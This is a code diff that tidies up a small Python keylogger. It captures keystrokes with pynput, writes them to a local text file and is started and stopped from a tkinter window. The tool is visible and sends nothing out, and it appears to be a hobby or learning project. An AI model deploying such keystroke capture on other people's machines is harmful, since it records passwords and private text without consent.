@@ -1,18 +1,12 @@
 from pynput import keyboard
-from pynput.keyboard import Key,Listener
-from datetime import datetime
+from pynput.keyboard import Key, Listener
 from tkinter import Tk, Label, Button
-import json
 
 keys = []
 listener = None
 
-with open("keylogger.txt", "a") as f:
-    f.write("TimeStamps"+(str(datetime.now()))[:-7]+":\n")
-    f.write("\n")
-    
 def on_press(key):
-    global count, keys
+    global keys
     keys.append(key)
     write_file(keys)
     keys = []
@@ -20,21 +14,15 @@ def on_press(key):
 def on_release(key):
     if key == Key.esc:
         return False
-        
-        
-        
+
 def write_file(keys):
     with open("keylogger.txt", "a") as f:
-        for idx, key in enumerate(keys):
-            k = str(keys).replace("'", "")
-            if k.find("space") > 0 and k.find("backspace") == -1:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if "space" in k and "backspace" not in k:
                 f.write("\n")
-            elif k.find("Key") == -1:
+            elif "Key" not in k:
                 f.write(k)
-                
-
-
-        
 
 def start_keylogger():
     global listener
@@ -63,6 +51,5 @@ start_button.pack()
 stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
 stop_button.pack()
 
-root.geometry("300x100")  
-
+root.geometry("300x100")
 root.mainloop()
